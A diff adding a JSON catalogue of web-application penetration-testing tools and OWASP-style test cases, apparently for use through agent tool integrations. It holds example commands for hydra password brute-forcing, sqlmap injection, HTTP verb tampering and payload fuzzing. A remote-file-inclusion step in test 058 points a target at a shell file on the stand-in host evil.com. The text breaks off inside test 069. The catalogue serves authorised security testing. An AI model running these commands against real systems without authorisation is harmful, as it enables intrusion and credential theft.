@@ -1,0 +1,2813 @@
+{
+  "category_name": "Web Application Security Assessment",
+  "tools": [
+    {
+      "name": "Burp Suite",
+      "description": "Intercepting proxy, scanner, and more."
+    },
+    {
+      "name": "OWASP ZAP",
+      "description": "Open-source alternative to Burp Suite."
+    },
+    {
+      "name": "Nmap",
+      "description": "Network mapping and port scanning."
+    },
+    {
+      "name": "Nikto",
+      "description": "Web server scanner."
+    },
+    {
+      "name": "GoBuster/Dirb",
+      "description": "Directory and file brute-forcing."
+    },
+    {
+      "name": "SQLMap",
+      "description": "SQL injection detection and exploitation."
+    },
+    {
+      "name": "ffuf",
+      "description": "Fast web fuzzer."
+    },
+    {
+      "name": "Sublist3r/Amass",
+      "description": "Subdomain enumeration."
+    },
+    {
+      "name": "dotdotpwn",
+      "description": "Directory traversal fuzzer."
+    },
+    {
+      "name": "httprint/httprecon",
+      "description": "Web server fingerprinting."
+    },
+    {
+      "name": "Netcraft",
+      "description": "Online tool for web server information."
+    },
+    {
+      "name": "Wappalyzer",
+      "description": "Browser extension for technology detection."
+    },
+    {
+      "name": "BlindElephant",
+      "description": "Web application fingerprinting based on static file checksums."
+    },
+    {
+      "name": "Dirbuster",
+      "description": "Directory and file brute-forcing."
+    },
+    {
+      "name": "THC-HYDRA",
+      "description": "Brute-forcing tool for various services."
+    },
+    {
+      "name": "Burp Intruder",
+      "description": "Automated custom attacks."
+    },
+    {
+      "name": "NetCat/cURL",
+      "description": "Command-line tools for network connections and HTTP requests."
+    },
+    {
+      "name": "OpenSSL",
+      "description": "SSL/TLS toolkit."
+    },
+    {
+      "name": "sslyze",
+      "description": "SSL/TLS vulnerability scanner."
+    },
+    {
+      "name": "testssl.sh",
+      "description": "Command-line tool for checking TLS/SSL ciphers, protocols and vulnerabilities."
+    },
+    {
+      "name": "Metasploit Framework",
+      "description": "Exploitation framework (for Metasploit modules)."
+    },
+    {
+      "name": "Postman",
+      "description": "API development and testing platform."
+    },
+    {
+      "name": "Kiterunner",
+      "description": "API endpoint scanner."
+    },
+    {
+      "name": "jwt_tool",
+      "description": "JWT (JSON Web Token) testing tool."
+    },
+    {
+      "name": "SonarQube",
+      "description": "Static code analysis platform."
+    },
+    {
+      "name": "Bandit",
+      "description": "Python code analyzer."
+    },
+    {
+      "name": "Semgrep",
+      "description": "Lightweight static analysis tool."
+    },
+    {
+      "name": "Grep",
+      "description": "Command-line utility for searching plain-text data sets for lines that match a regular expression."
+    },
+    {
+      "name": "CrackMapExec (CME)",
+      "description": "Post-exploitation tool for Active Directory environments."
+    },
+    {
+      "name": "SMBClient",
+      "description": "Client for accessing SMB/CIFS shares."
+    },
+    {
+      "name": "Responder",
+      "description": "LLMNR, NBT-NS and mDNS poisoner."
+    },
+    {
+      "name": "hashcat",
+      "description": "Advanced password recovery tool."
+    },
+    {
+      "name": "Evil-WinRM",
+      "description": "Windows Remote Management shell."
+    },
+    {
+      "name": "Certify.exe / SertaPi",
+      "description": "Tools for enumerating and exploiting Active Directory Certificate Services (AD CS) vulnerabilities."
+    },
+    {
+      "name": "Rubeus.exe",
+      "description": "C# toolset for Kerberos interaction and abuse."
+    },
+    {
+      "name": "Impacket",
+      "description": "A collection of Python classes for working with network protocols. Includes `mssqlclient.py`, `psexec.py`, and `ticketer.py`."
+    },
+    {
+      "name": "PowerUpSQL",
+      "description": "SQL Server Toolkit for penetration testers."
+    },
+    {
+      "name": "TCPdump/Wireshark",
+      "description": "Packet analyzer for network traffic."
+    }
+  ],
+  "test_cases": [
+    {
+      "id": "hiesen-web-testing-001",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Conduct Search Engine Discovery and Reconnaissance for Information Leakage",
+      "tools": [
+        "Google",
+        "Bing",
+        "DuckDuckGo",
+        "Shodan",
+        "PunkSpider"
+      ],
+      "steps": [
+        "Search for `site:example.com filetype:pdf` to find sensitive documents.",
+        "Search for `site:example.com inurl:admin` to find admin interfaces.",
+        "Search for `site:example.com intitle:\"index of\" password` to find password files."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-002",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Fingerprint Web Server",
+      "tools": [
+        "Nmap",
+        "Netcat",
+        "httprint",
+        "httprecon",
+        "Netcraft",
+        "Wappalyzer"
+      ],
+      "steps": [
+        "Command: `nmap -sV -p 80,443 <target_ip>`",
+        "Command: `nc <target_ip> 80` then `HEAD / HTTP/1.0` to check `Server` header."
+      ],
+      "mcp_tools": [
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-003",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Review Webserver Metafiles for Information Leakage",
+      "tools": [
+        "Browser (View Source)",
+        "curl",
+        "wget",
+        "rockspider"
+      ],
+      "steps": [
+        "Command: `curl http://example.com/robots.txt`",
+        "Command: `wget http://example.com/robots.txt`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-004",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Enumerate Applications on Webserver",
+      "tools": [
+        "Dirbuster",
+        "OWASP ZAP",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Command: `dirb http://example.com /usr/share/wordlists/dirb/common.txt`",
+        "Command: Use OWASP ZAP spidering to discover hidden paths."
+      ],
+      "mcp_tools": [
+        "dirb"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-005",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Review Webpage Comments and Metadata for Information Leakage",
+      "tools": [
+        "Browser (View Source)",
+        "text editors",
+        "grep"
+      ],
+      "steps": [
+        "Test: Manually inspect HTML source for comments like `` or ``.",
+        "Command: `grep -r -i \"password\" .` in the codebase."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-006",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Identify application entry points",
+      "tools": [
+        "Intercepting proxies (Burp Suite, OWASP ZAP)",
+        "browser developer tools"
+      ],
+      "steps": [
+        "Test: Manually browse the application with an intercepting proxy to identify all parameters.",
+        "Test: Examine HTTP requests for hidden fields and custom cookies."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-007",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Map execution paths through application",
+      "tools": [
+        "OWASP ZAP (Automatic Spidering)",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Test: Use spidering tools to map all accessible URLs and parameters.",
+        "Test: Manually explore the application to identify decision points and significant code paths."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-008",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Fingerprint Web Application Framework",
+      "tools": [
+        "WhatWeb",
+        "Wappalyzer",
+        "Nmap (with http-fingerprint script)"
+      ],
+      "steps": [
+        "Command: `whatweb example.com`",
+        "Test: Check `X-Powered-By` headers, cookies, and HTML source code for framework indicators."
+      ],
+      "mcp_tools": [
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-009",
+      "title": "Information Gathering (OTG-INFO)",
+      "description": "Fingerprint Web Application",
+      "tools": [
+        "BlindElephant",
+        "WPScan",
+        "Nmap (with relevant scripts)"
+      ],
+      "steps": [
+        "Command: `python BlindElephant.py http://example.com`",
+        "Command: `wpscan --url http://example.com` (for WordPress sites)."
+      ],
+      "mcp_tools": [
+        "wpscan",
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-010",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Test Network/Infrastructure Configuration",
+      "tools": [
+        "Nmap",
+        "network scanners"
+      ],
+      "steps": [
+        "Command: `nmap -p- -sV <target_ip>` to identify open ports and services.",
+        "Test: Check for default credentials on network devices."
+      ],
+      "mcp_tools": [
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-011",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Test Application Platform Configuration",
+      "tools": [
+        "Nikto",
+        "Nmap (with http-enum script)"
+      ],
+      "steps": [
+        "Command: `nikto -h http://example.com`",
+        "Test: Check for default installations, sample files, and directory listings."
+      ],
+      "mcp_tools": [
+        "nikto",
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-012",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Test File Extensions Handling for Sensitive Information",
+      "tools": [
+        "ffuf",
+        "Burp Suite",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w extensions.txt -u \"http://example.com/file.FUZZ\" -mc all -fc 404`",
+        "Test: Try to access files with extensions like `.bak`, `.old`, `.inc`, `.java`."
+      ],
+      "mcp_tools": [
+        "ffuf"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-013",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Review Old, Backup and Unreferenced Files for Sensitive Information",
+      "tools": [
+        "Dirbuster",
+        "wfuzz",
+        "search engines"
+      ],
+      "steps": [
+        "Command: `dirb http://example.com /usr/share/wordlists/dirb/big.txt`",
+        "Test: Search for `site:example.com inurl:backup` or `site:example.com inurl:old`."
+      ],
+      "mcp_tools": [
+        "dirb"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-014",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Enumerate Infrastructure and Application Admin Interfaces",
+      "tools": [
+        "Dirbuster",
+        "ffuf",
+        "Burp Suite",
+        "THC-Hydra"
+      ],
+      "steps": [
+        "Command: `dirb http://example.com /usr/share/wordlists/common.txt -X .php,.asp,.html`",
+        "Command: `ffuf -w /usr/share/wordlists/common.txt -u \"http://example.com/FUZZ\" -mc 200,204,301,302,307 -e .php,.asp,.html`",
+        "Command: `hydra -L users.txt -P passwords.txt <target_ip> http-get /admin/login.php`"
+      ],
+      "mcp_tools": [
+        "dirb",
+        "ffuf",
+        "hydra"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-015",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Test HTTP Methods",
+      "tools": [
+        "Nmap (http-methods.nse)",
+        "curl",
+        "Netcat"
+      ],
+      "steps": [
+        "Command: `nmap --script http-methods.nse example.com`",
+        "Command: `curl -X OPTIONS http://example.com` to list allowed methods."
+      ],
+      "mcp_tools": [
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-016",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Test HTTP Strict Transport Security",
+      "tools": [
+        "curl",
+        "browser developer tools"
+      ],
+      "steps": [
+        "Command: `curl -s -D- https://example.com/ | grep Strict-Transport-Security`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-017",
+      "title": "Configuration and Deployment Management Testing (OTG-CONFIG)",
+      "description": "Test RIA cross domain policy",
+      "tools": [
+        "OWASP ZAP",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Test: Retrieve `crossdomain.xml` and `clientaccesspolicy.xml` and analyze their permissions."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-018",
+      "title": "Identity Management Testing (OTG-IDENT)",
+      "description": "Test Role Definitions",
+      "tools": [
+        "Manual review",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Create a role-permission matrix and verify access controls."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-019",
+      "title": "Identity Management Testing (OTG-IDENT)",
+      "description": "Test User Registration Process",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Attempt to register with various inputs (e.g., special characters, existing usernames).",
+        "Test: Check for identity verification and authorization steps."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-020",
+      "title": "Identity Management Testing (OTG-IDENT)",
+      "description": "Test Account Provisioning Process",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Attempt to provision accounts with different roles and privileges.",
+        "Test: Check for verification and authorization steps during provisioning."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-021",
+      "title": "Identity Management Testing (OTG-IDENT)",
+      "description": "Testing for Account Enumeration and Guessable User Account",
+      "tools": [
+        "Burp Intruder",
+        "THC-Hydra",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Use error messages from login forms to distinguish between valid and invalid usernames.",
+        "Command: `hydra -L users.txt -p password <target_ip> http-post-form \"/login.php:user=^USER^&pass=password:F=Invalid\"`"
+      ],
+      "mcp_tools": [
+        "hydra"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-022",
+      "title": "Identity Management Testing (OTG-IDENT)",
+      "description": "Testing for Weak or unenforced username policy",
+      "tools": [
+        "Manual testing",
+        "Burp Intruder"
+      ],
+      "steps": [
+        "Test: Attempt to create usernames that violate policy (e.g., too short, special characters)."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-023",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for Credentials Transported over an Encrypted Channel",
+      "tools": [
+        "Intercepting proxies (Burp Suite, OWASP ZAP)",
+        "Wireshark"
+      ],
+      "steps": [
+        "Test: Attempt to login over HTTP and check if it's redirected to HTTPS.",
+        "Test: Capture traffic with Wireshark to ensure no cleartext credentials."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-024",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for default credentials",
+      "tools": [
+        "THC-Hydra",
+        "Nmap (with http-default-accounts.nse script)",
+        "common default password lists"
+      ],
+      "steps": [
+        "Command: `hydra -L users.txt -P default_passwords.txt <target_ip> http-get /admin/login.php`"
+      ],
+      "mcp_tools": [
+        "hydra",
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-025",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for Weak lock out mechanism",
+      "tools": [
+        "Burp Intruder",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Attempt multiple failed logins to trigger lockout and observe behavior."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-026",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for bypassing authentication schema",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Try direct access to protected pages without authentication.",
+        "Test: Tamper with parameters like `authenticated=no` to `authenticated=yes`."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-027",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Test remember password functionality",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Check if sensitive information is stored in cookies or local storage.",
+        "Test: Analyze the token for predictability and tamper-resistance."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-028",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for Browser cache weakness",
+      "tools": [
+        "Browser developer tools",
+        "CacheViewer2 (Firefox add-on)"
+      ],
+      "steps": [
+        "Test: After logging out, use the browser's back button to check for sensitive information.",
+        "Test: Check `Cache-Control` headers for `no-store`, `no-cache`."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-029",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for Weak password policy",
+      "tools": [
+        "Burp Intruder",
+        "THC-Hydra"
+      ],
+      "steps": [
+        "Test: Attempt to create passwords that violate policy (e.g., too short, simple).",
+        "Test: Check for password reuse and aging requirements."
+      ],
+      "mcp_tools": [
+        "hydra"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-030",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for Weak security question/answer",
+      "tools": [
+        "Manual testing",
+        "social engineering"
+      ],
+      "steps": [
+        "Test: Attempt to answer security questions with publicly available information.",
+        "Test: Check for pre-generated questions with easily guessable answers."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-031",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for weak password change or reset functionalities",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Check if the old password is required for changing the password.",
+        "Test: Analyze password reset links for predictability and one-time use."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-032",
+      "title": "Authentication Testing (OTG-AUTHN)",
+      "description": "Testing for Weaker authentication in alternative channel",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Compare authentication policies across different channels."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-033",
+      "title": "Authorization Testing (OTG-AUTHZ)",
+      "description": "Testing Directory traversal/file include",
+      "tools": [
+        "DotDotPwn",
+        "ffuf",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Command: `ffuf -w traversal_payloads.txt -u \"http://example.com/files?file=FUZZ\"`"
+      ],
+      "mcp_tools": [
+        "ffuf"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-034",
+      "title": "Authorization Testing (OTG-AUTHZ)",
+      "description": "Testing for bypassing authorization schema",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Try to access administrative functions with standard user privileges.",
+        "Test: Tamper with role/privilege parameters."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-035",
+      "title": "Authorization Testing (OTG-AUTHZ)",
+      "description": "Testing for Privilege Escalation",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Try to modify user roles or permissions to gain higher privileges."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-036",
+      "title": "Authorization Testing (OTG-AUTHZ)",
+      "description": "Testing for Insecure Direct Object References",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Try to access objects (e.g., user profiles, invoices) of other users by changing the ID in the URL."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-037",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Testing for Bypassing Session Management Schema",
+      "tools": [
+        "Burp Sequencer",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Analyze session ID generation for randomness and predictability."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-038",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Testing for Cookies attributes",
+      "tools": [
+        "Browser developer tools",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Check for `Secure`, `HttpOnly`, `Domain`, `Path`, and `Expires` attributes."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-039",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Testing for Session Fixation",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Provide a known session ID to a user and check if it's reused after login."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-040",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Testing for Exposed Session Variables",
+      "tools": [
+        "Intercepting proxies",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Examine HTTP requests and responses for sensitive session data."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-041",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Testing for Cross Site Request Forgery",
+      "tools": [
+        "OWASP ZAP",
+        "Burp Suite",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Attempt to perform state-changing actions without anti-CSRF tokens."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-042",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Testing for logout functionality",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: After logging out, try to access authenticated pages using the old session."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-043",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Test Session Timeout",
+      "tools": [
+        "Manual testing",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Remain inactive for a period and check if the session times out."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-044",
+      "title": "Session Management Testing (OTG-SESS)",
+      "description": "Testing for Session puzzling",
+      "tools": [
+        "Manual testing",
+        "source code review"
+      ],
+      "steps": [
+        "Test: Manipulate session variables to bypass authentication or gain privileges."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-045",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Reflected Cross Site Scripting",
+      "tools": [
+        "Wfuzz",
+        "Burp Suite",
+        "OWASP ZAP"
+      ],
+      "steps": [
+        "Command: `ffuf -w xss_payloads.txt -u \"http://example.com/search?q=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-046",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Stored Cross Site Scripting",
+      "tools": [
+        "Burp Suite",
+        "OWASP ZAP",
+        "manual testing"
+      ],
+      "steps": [
+        "Test: Submit malicious scripts in user input fields (e.g., comments, profiles) and check if they are executed when viewed."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-047",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for HTTP Verb Tampering",
+      "tools": [
+        "curl",
+        "Netcat",
+        "Nmap (http-methods.nse)"
+      ],
+      "steps": [
+        "Command: `curl -X PUT http://example.com/file.txt -d \"malicious content\"`",
+        "Command: `curl -X DELETE http://example.com/file.txt`"
+      ],
+      "mcp_tools": [
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-048",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for HTTP Parameter pollution",
+      "tools": [
+        "Wfuzz",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Command: `ffuf -w hpp_payloads.txt -u \"http://example.com/search?q=FUZZ&q=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-049",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for SQL Injection",
+      "tools": [
+        "SQLMap",
+        "Burp Suite",
+        "OWASP ZAP"
+      ],
+      "steps": [
+        "Command: `sqlmap -u \"http://example.com/login\" --data=\"username=admin&password=password\" --batch`"
+      ],
+      "mcp_tools": [
+        "sqlmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-050",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for LDAP Injection",
+      "tools": [
+        "ffuf",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w ldap_payloads.txt -u \"http://example.com/search?user=FUZZ\" -mc all -fc 404`"
+      ],
+      "mcp_tools": [
+        "ffuf"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-051",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for ORM Injection",
+      "tools": [
+        "Burp Suite",
+        "manual testing",
+        "source code review"
+      ],
+      "steps": [
+        "Test: Inject SQL payloads into ORM-generated queries."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-052",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for XML Injection",
+      "tools": [
+        "Wfuzz",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Command: `ffuf -w xml_payloads.txt -u \"http://example.com/api?data=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-053",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for SSI Injection",
+      "tools": [
+        "Wfuzz",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w ssi_payloads.txt -u \"http://example.com/page.shtml?name=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-054",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for XPath Injection",
+      "tools": [
+        "Wfuzz",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w xpath_payloads.txt -u \"http://example.com/search?query=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-055",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for IMAP/SMTP Injection",
+      "tools": [
+        "Netcat",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Inject IMAP/SMTP commands into mail server interactions."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-056",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Code Injection",
+      "tools": [
+        "Wfuzz",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w code_payloads.txt -u \"http://example.com/execute?cmd=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-057",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Local File Inclusion",
+      "tools": [
+        "Wfuzz",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w lfi_payloads.txt -u \"http://example.com/page.php?file=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-058",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Remote File Inclusion",
+      "tools": [
+        "Wfuzz",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w rfi_payloads.txt -u \"http://example.com/page.php?file=http://evil.com/shell.txt\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-059",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Command Injection",
+      "tools": [
+        "Wfuzz",
+        "custom scripts"
+      ],
+      "steps": [
+        "Command: `ffuf -w cmd_payloads.txt -u \"http://example.com/execute?cmd=FUZZ\"`"
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-060",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Buffer overflow",
+      "tools": [
+        "Fuzzers",
+        "GDB",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Provide overly long input strings to trigger crashes."
+      ],
+      "mcp_tools": [
+        "gdb"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-061",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Heap overflow",
+      "tools": [
+        "Fuzzers",
+        "GDB",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Provide crafted input to corrupt heap memory."
+      ],
+      "mcp_tools": [
+        "gdb"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-062",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Stack overflow",
+      "tools": [
+        "Fuzzers",
+        "GDB",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Provide overly long input to overwrite return addresses."
+      ],
+      "mcp_tools": [
+        "gdb"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-063",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for Format string",
+      "tools": [
+        "Fuzzers",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Provide format string specifiers (e.g., `%x`, `%n`) in user input."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-064",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for incubated vulnerabilities",
+      "tools": [
+        "Burp Suite",
+        "OWASP ZAP",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Inject XSS payloads that are stored and executed later."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-065",
+      "title": "Input Validation Testing (OTG-INPVAL)",
+      "description": "Testing for HTTP Splitting/Smuggling",
+      "tools": [
+        "curl",
+        "Netcat",
+        "custom scripts"
+      ],
+      "steps": [
+        "Test: Inject CR+LF sequences into HTTP headers."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-066",
+      "title": "Error Handling (OTG-ERR)",
+      "description": "Analysis of Error Codes",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Submit invalid requests and analyze server responses for detailed error messages."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-067",
+      "title": "Error Handling (OTG-ERR)",
+      "description": "Analysis of Stack Traces",
+      "tools": [
+        "Manual testing",
+        "intercepting proxies"
+      ],
+      "steps": [
+        "Test: Trigger application errors and examine stack traces for internal paths, variable names."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-068",
+      "title": "Cryptography (OTG-CRYPST)",
+      "description": "Testing for Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection",
+      "tools": [
+        "sslyze",
+        "testssl.sh",
+        "Nmap (ssl-enum-ciphers.nse)"
+      ],
+      "steps": [
+        "Command: `sslyze --regular example.com:443`",
+        "Command: `testssl.sh example.com`"
+      ],
+      "mcp_tools": [
+        "nmap"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-069",
+      "title": "Cryptography (OTG-CRYPST)",
+      "description": "Testing for Padding Oracle",
+      "tools": [
+        "PadBuster",
+        "custom scripts"
+      ],
+      "steps": [
